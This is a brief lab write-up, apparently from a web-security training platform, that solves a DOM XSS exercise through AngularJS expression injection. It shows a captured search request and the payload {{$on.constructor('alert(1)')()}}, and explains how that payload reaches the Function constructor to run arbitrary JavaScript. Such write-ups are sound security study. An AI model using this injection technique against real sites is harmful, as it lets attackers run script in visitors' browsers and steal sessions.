Lab 11 : DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

Captured request by searching a string .

#### 📤 Request
```http
GET /?search=hello123 HTTP/2
Host: 0abe0081048d6c268048859800f700e3.web-security-academy.net
Cookie: session=Ig1FH1icqWLzFquNfOfAGwHt3kojJBqz
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0abe0081048d6c268048859800f700e3.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

Found the `ng-app` directive .


If we search for something containing `{{...}}`, Angular will try to evaluate it as an expression .

This payload `{{$on.constructor('alert(1)')()}}` works as `$on` is a built-in method inherited from AngularJS's root scope, available inside any expression. Every JS function has a `.constructor` property pointing to the Function constructor. So `$on.constructor('alert(1)')` creates a brand-new function whose body is alert(1), and the trailing `()` immediately invokes it — giving a arbitrary code execution entirely through Angular's expression evaluator .

After searching the payload lab will be solved.